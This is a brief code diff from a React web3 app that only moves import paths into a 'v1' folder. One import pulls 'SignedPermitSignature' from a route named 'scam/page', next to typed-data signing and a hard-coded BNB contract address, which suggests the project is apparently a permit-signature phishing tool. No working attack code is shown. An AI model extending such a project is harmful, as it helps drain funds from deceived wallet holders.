@@ -6,10 +6,10 @@ import {signTypedData} from "@wagmi/core";
 import {config} from "@/context/config";
 import {BigNumber, ethers, Wallet} from "ethers";
 import React, {useEffect, useState} from "react";
-import {useEthersProvider, useEthersSigner} from "@/app/(version1)/ethers";
-import TokenList, {ContractCovalenTHQ} from "@/app/(version1)/TokenList";
+import {useEthersProvider, useEthersSigner} from "@/app/(version1)/v1/ethers";
+import TokenList, {ContractCovalenTHQ} from "@/app/(version1)/v1/TokenList";
 import {JsonRpcSigner} from "@ethersproject/providers";
-import {SignedPermitSignature} from "@/app/(version1)/scam/page";
+import {SignedPermitSignature} from "@/app/(version1)/v1/scam/page";
 
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
